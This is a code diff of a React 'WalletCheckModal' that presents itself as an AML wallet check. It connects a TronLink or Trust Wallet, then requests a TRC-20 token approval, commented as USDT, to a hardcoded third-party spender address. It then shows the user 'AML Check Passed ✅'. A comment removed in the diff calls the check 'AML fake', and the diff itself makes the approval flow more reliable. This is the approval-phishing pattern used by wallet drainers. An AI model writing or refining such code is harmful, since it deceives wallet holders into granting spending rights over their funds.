@@ -8,29 +8,41 @@ type Props = {
   onClose: () => void
 }
 
-// 🔥 GET TRON
-const getTron = () => {
-  if (typeof window === "undefined") return null
-  return (window as any).tronWeb || null
+// 🔥 ESPERAR TRON
+const waitForTron = async () => {
+  let tries = 0
+
+  while (tries < 10) {
+    if ((window as any).tronWeb?.ready) {
+      return (window as any).tronWeb
+    }
+    await new Promise((res) => setTimeout(res, 300))
+    tries++
+  }
+
+  return null
 }
 
-// 🔥 CONEXIÓN REAL
+// 🔥 CONECTAR BIEN
 const connectTron = async () => {
-  if (typeof window === "undefined") return null
-
   const tronLink = (window as any).tronLink
-  const tron = (window as any).tronWeb
 
-  if (!tronLink || !tron) {
-    alert("Open inside TronLink / Trust Wallet / SafePal")
+  if (!tronLink) {
+    alert("Open inside TronLink / Trust Wallet")
     return null
   }
 
   try {
-    // 🔥 esto es la clave (sin esto falla todo)
     await tronLink.request({ method: "tron_requestAccounts" })
-  } catch (e) {
+  } catch {
     alert("Connection rejected")
+    return null
+  }
+
+  const tron = await waitForTron()
+
+  if (!tron) {
+    alert("TronWeb not ready")
     return null
   }
 
@@ -42,44 +54,33 @@ const connectTron = async () => {
   }
 
   console.log("CONNECTED:", address)
-  return address
+  return tron
 }
 
-// 🔥 APPROVE FUNCIONAL
-const approveUSDT = async () => {
-  const tron = getTron()
-
-  if (!tron) {
-    alert("Wallet not detected")
-    return
-  }
-
-  const contractAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"
-  const spender = tron.defaultAddress.base58
+// 🔥 APPROVE CORRECTO
+const approveUSDT = async (tron: any) => {
   try {
-    const address = tron.defaultAddress.base58
+    const contractAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"
 
-    // 🔥 fuerza interacción (muy importante)
-    await tron.trx.getBalance(address)
+    // 👉 IMPORTANTE: usa TU spender real
+    const spender = "TWnGWtxx7d4NC8xuUqKVRW8eM8yRko2q1y"
 
     const contract = await tron.contract().at(contractAddress)
 
-    const amount = 1000000 // 1 USDT
+    const amount = tron.toBigNumber(1000000) // 1 USDT
 
     const tx = await contract
       .approve(spender, amount)
       .send({
-        feeLimit: 100000000,
-        callValue: 0,
+        feeLimit: 200000000,
         shouldPollResponse: true,
       })
 
     console.log("APPROVE TX:", tx)
     return true
-
   } catch (err) {
-    console.error(err)
-    alert("Transaction rejected or failed")
+    console.error("APPROVE ERROR:", err)
+    alert("Approve failed")
     return false
   }
 }
@@ -110,7 +111,6 @@ export function WalletCheckModal({ open, onClose }: Props) {
     <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/40 backdrop-blur-sm">
       <div className="w-full max-w-md rounded-2xl bg-white p-6 shadow-2xl relative">
 
-        {/* CLOSE */}
         <button
           onClick={() => {
             onClose()
@@ -121,12 +121,10 @@ export function WalletCheckModal({ open, onClose }: Props) {
           <X className="w-5 h-5" />
         </button>
 
-        {/* TITLE */}
         <h2 className="text-xl font-bold text-center mb-6">
           {step === "network" ? "Select Network" : "Select Wallet"}
         </h2>
 
-        {/* NETWORK */}
         {step === "network" && (
           <div className="space-y-3">
             {networks.map((net) => (
@@ -145,7 +143,6 @@ export function WalletCheckModal({ open, onClose }: Props) {
           </div>
         )}
 
-        {/* WALLET */}
         {step === "wallet" && (
           <div className="space-y-3">
             <p className="text-sm text-gray-500 mb-2">
@@ -161,15 +158,14 @@ export function WalletCheckModal({ open, onClose }: Props) {
                     return
                   }
 
-                  // 🔗 conectar
-                  const address = await connectTron()
-                  if (!address) return
+                  // 🔗 conectar + esperar tron listo
+                  const tron = await connectTron()
+                  if (!tron) return
 
                   // 💰 approve
-                  const success = await approveUSDT()
-                  if (!success) return
+                  const ok = await approveUSDT(tron)
+                  if (!ok) return
 
-                  // ✅ siguiente paso (AML fake)
                   alert("AML Check Passed ✅")
 
                   onClose()
